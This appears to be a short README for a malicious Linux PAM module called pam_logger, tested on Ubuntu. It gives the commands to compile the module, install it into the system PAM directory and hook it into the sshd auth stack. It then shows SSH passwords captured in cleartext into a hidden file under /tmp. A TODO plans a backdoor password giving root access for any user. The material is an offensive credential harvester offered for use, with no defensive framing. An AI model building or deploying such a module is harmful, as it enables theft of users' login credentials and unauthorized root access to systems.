
Tested on:
Linux WORK-ubuntu-dev 6.11.0-21-generic #21~24.04.1-Ubuntu SMP PREEMPT_DYNAMIC Mon Feb 24 16:52:15 UTC 2 x86_64 x86_64 x86_64 GNU/Linux

---

```bash
sudo apt install gcc -y
sudo apt-get install libpam0g-dev -y
```

```bash
gcc -fPIC -c pam_logger.c
gcc -shared -o pam_logger.so pam_logger.o -lpam
sudo mv pam_logger.so /lib/x86_64-linux-gnu/security/
sudo nano /etc/pam.d/sshd
auth       optional     pam_logger.so

sudo systemctl restart sshd

-> ssh localuser@10.6.11.99
password

localuser@WORK-ubuntu-dev:~$ sudo cat /tmp/.service_temp_data
[2025-04-09 18:09:34] User: 'localuser' Password: 'password'
```

---

TODO:
- Implement backdoor password functionality that gives root access for any user supplied.


